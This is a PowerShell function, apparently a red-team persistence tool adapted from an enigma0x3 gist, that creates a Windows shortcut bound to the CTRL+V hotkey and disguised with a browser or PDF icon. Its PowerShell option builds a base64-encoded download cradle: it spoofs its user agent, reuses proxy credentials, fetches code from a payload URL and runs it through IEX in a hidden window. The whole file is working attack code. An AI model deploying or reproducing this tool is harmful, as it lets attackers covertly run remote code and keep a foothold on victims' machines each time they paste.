function Create-HotKeyLNK {
<#
    .SYNOPSIS

        Create an LNK file that bind's to a hotkey. Place on the desktop or $env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts for persistence.

    .DESCRIPTION

        Modified from @enigma0x3 https://gist.github.com/enigma0x3/167a213eee2e245986a5ca90bab76c6a

    .PARAMETER LNKName

        The name of the .LNK file to create. No extension required.

    .PARAMETER EXEPath

        Path to the exe you want to execute.

    .PARAMETER PowerShell

        Switch to use PowerShell as the EXE.

    .PARAMETER IconPath

        Path to an exe for an icon. Defaults to Internet Explorer. Use "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13" for PDF extension.

    .PARAMETER HotKey

        HotKey to bind to. Defaults to "CTRL+V".
    
    .PARAMETER PowerShellPayloadURL

        URL to your PowerShell payload http://mydomain.com/payload.svg

   .EXAMPLE

        Create-HotKeyLNK -Name Google -EXEPath "C:\Windows\System32\calc.exe" -HotKey "CTRL+V"
        
    
#>
    [CmdletBinding()]
    param(
    [Parameter(Mandatory=$True)]
        [String]
        $LNKName = "IE",

        [Parameter(Mandatory=$False)]
        [String]
        $EXEPath = "",

        [Parameter(Mandatory=$False)]
        [String]
        $EXEArgs = "",

        [Parameter(Mandatory=$False)]
        [Switch]
        $PowerShell = $False,

        [Parameter(Mandatory=$False)]
        [String]
        $IconPath = "$env:programfiles\Internet Explorer\iexplore.exe",

        [Parameter(Mandatory=$False)]
        [Switch]
        $PDFIcon,

        [Parameter(Mandatory=$False)]
        [String]
        $HotKey = "CTRL+V",

        [Parameter(Mandatory=$False)]
        [String]
        $PowerShellPayloadURL = ""
        )

    if ($PowerShell -eq $True) {
        $PowerShell = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
        $payload = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$PowerShellPayloadURL'))"
        $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
        $EXEPath = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
        $arguments = "-nop -WindowStyle Hidden -enc $encodedPayload"
        
    } 
    
    $obj = New-Object -ComObject WScript.Shell
    $link = $obj.CreateShortcut((Get-Location).Path + "\" + $LNKName + ".lnk")
    $link.WindowStyle = '7'
    $link.TargetPath = $EXEPath
    $link.HotKey = $HotKey
    if ($PDFIcon) {
        $link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
    } else {
        $link.IconLocation = $IconPath
    }
    $link.Arguments = $arguments
    $link.Save()
    Write-Host "Done!"
}
